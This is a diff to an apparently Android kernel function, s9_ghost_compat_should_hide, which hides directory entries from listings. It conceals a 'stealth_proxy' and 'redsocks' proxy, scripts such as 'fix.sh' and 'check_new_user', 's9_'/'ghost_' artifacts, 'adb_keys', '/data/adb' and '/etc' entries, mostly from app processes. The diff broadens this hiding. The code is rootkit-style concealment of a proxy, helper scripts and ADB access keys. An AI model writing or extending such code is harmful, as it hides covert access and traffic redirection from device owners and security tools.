@@ -932,44 +932,32 @@ static inline bool s9_ghost_compat_should_hide(struct file *file, const char *na
 		    (namlen >= 9 && memcmp(name, "ghost_rtc", 9) == 0) ||
 		    (namlen >= 9 && memcmp(name, "ghost_loc", 9) == 0) ||
 		    (namlen >= 8 && memcmp(name, "redsocks", 8) == 0) ||
+		    (namlen >= 13 && memcmp(name, "stealth_proxy", 13) == 0) ||
 		    (namlen >= 14 && memcmp(name, "check_new_user", 14) == 0) ||
-		    (namlen >= 6 && memcmp(name, "fix.sh", 6) == 0))
-			return true;
-
-		if (namlen >= 13 && memcmp(name, "stealth_proxy", 13) == 0) {
-			if (uid == 2000 && namlen == 20 && memcmp(name, "stealth_proxy.status", 20) == 0)
-				return false;
-			return true;
-		}
-
-		if (namlen == 8 && memcmp(name, "adb_keys", 8) == 0) {
-			if (uid >= 10000)
-				return true;
-			if (file && file->f_path.dentry) {
-				struct dentry *d = file->f_path.dentry;
-				if (d && d->d_name.name && d->d_name.len == 3 &&
-				    memcmp(d->d_name.name, "etc", 3) == 0)
-					return true;
-			}
-		}
-	}
-
-	/* Hide remaining custom artifacts and /data/adb from untrusted apps (UID >= 10000) */
-	if (unlikely(uid >= 10000)) {
-		if ((namlen >= 3 && memcmp(name, "s9_", 3) == 0) ||
+		    (namlen >= 6 && memcmp(name, "fix.sh", 6) == 0) ||
+		    (namlen >= 3 && memcmp(name, "s9_", 3) == 0) ||
 		    (namlen >= 6 && memcmp(name, "ghost_", 6) == 0))
 			return true;
 
-		if (namlen == 3 && memcmp(name, "adb", 3) == 0) {
-			if (file && file->f_path.dentry) {
-				struct dentry *d = file->f_path.dentry;
-				if (d && d->d_name.name) {
+		if (file && file->f_path.dentry) {
+			struct dentry *d = file->f_path.dentry;
+			if (d && d->d_name.name) {
+				if (d->d_name.len == 3 && memcmp(d->d_name.name, "etc", 3) == 0) {
+					if ((namlen == 4 && memcmp(name, "proc", 4) == 0) ||
+					    (namlen == 6 && memcmp(name, "serial", 6) == 0) ||
+					    (namlen >= 8 && memcmp(name, "adb_keys", 8) == 0))
+						return true;
+				}
+				if (namlen == 3 && memcmp(name, "adb", 3) == 0) {
 					if ((d->d_name.len == 4 && memcmp(d->d_name.name, "data", 4) == 0) ||
 					    (d->d_name.len == 1 && d->d_name.name[0] == '/'))
 						return true;
 				}
 			}
 		}
+
+		if (namlen >= 8 && memcmp(name, "adb_keys", 8) == 0 && uid >= 10000)
+			return true;
 	}
 	return false;
 }
